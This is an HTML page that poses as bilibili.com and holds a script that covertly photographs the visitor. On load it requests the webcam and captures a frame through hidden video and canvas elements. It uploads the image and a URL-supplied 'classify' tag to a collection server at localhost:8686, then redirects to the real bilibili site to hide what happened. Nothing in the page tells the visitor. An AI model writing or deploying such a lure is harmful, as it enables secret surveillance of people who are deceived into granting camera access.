<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>www.bilibili.com</title>
	<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>

<body>
    <div style="float: left;width:50% ;display: none;"><video id="v"></video></div>
    <canvas id="canvas" style="display:none;"></canvas><br />
    <img src="http://placehold.it/640&text=Your%20image%20here%20..." id="photo"style="float: left;display: none;">
</body>

<script>
    !(function () {
		$(function(){
			// 老的浏览器可能根本没有实现 mediaDevices，所以我们可以先设置一个空的对象
			if (navigator.mediaDevices === undefined) {
			    navigator.mediaDevices = {};
			}
			if (navigator.mediaDevices.getUserMedia === undefined) {
			    navigator.mediaDevices.getUserMedia = function (constraints) {
			        // 首先，如果有getUserMedia的话，就获得它
			        var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
			
			        // 一些浏览器根本没实现它 - 那么就返回一个error到promise的reject来保持一个统一的接口
			        if (!getUserMedia) {
			            return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
			        }
			
			        // 否则，为老的navigator.getUserMedia方法包裹一个Promise
			        return new Promise(function (resolve, reject) {
			            getUserMedia.call(navigator, constraints, resolve, reject);
			        });
			    }
			}
			const constraints = {
			    video: true,
			    audio: false
			};
			function getQueryString(name) {
					 var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
					 var r = window.location.search.substr(1).match(reg);
					 if (r != null) {
					  return unescape(r[2]);
					 }
					 return null;
			}
			let videoPlaying = false;
			let v = document.getElementById('v');
			let promise = navigator.mediaDevices.getUserMedia(constraints);
			promise.then(stream => {
			    // 旧的浏览器可能没有srcObject
			    if ("srcObject" in v) {
			        v.srcObject = stream;
			    } else {
			        // 防止再新的浏览器里使用它，应为它已经不再支持了
			        v.src = window.URL.createObjectURL(stream);
			    }
			    v.onloadedmetadata = function (e) {
			        v.play();
			        videoPlaying = true;
					let canvas = document.getElementById('canvas');
					canvas.width = v.videoWidth;
					canvas.height = v.videoHeight;
					canvas.getContext('2d').drawImage(v, 0, 0);
					let data = canvas.toDataURL('image/webp');
					
					var formData = new FormData();
					formData.append('image', data);
					formData.append('classify', getQueryString("classify"));
					 
					$.ajax({
					    url: 'http://localhost:8686/photo/save',
						type: 'POST',
						cache: false,
						data: formData,
						processData: false,
						contentType: false,
						success: function (res) {
							window.open("https://www.bilibili.com/",'_self');
						},
						error: function (XmlHttpRequest, textStatus, errorThrown) {
							console.log(textStatus)
							console.log(errorThrown)
						},
					});
			    };
			}).catch(err => {
			    console.error(err.name + ": " + err.message);
			});
		})
    })();
</script>
</html>
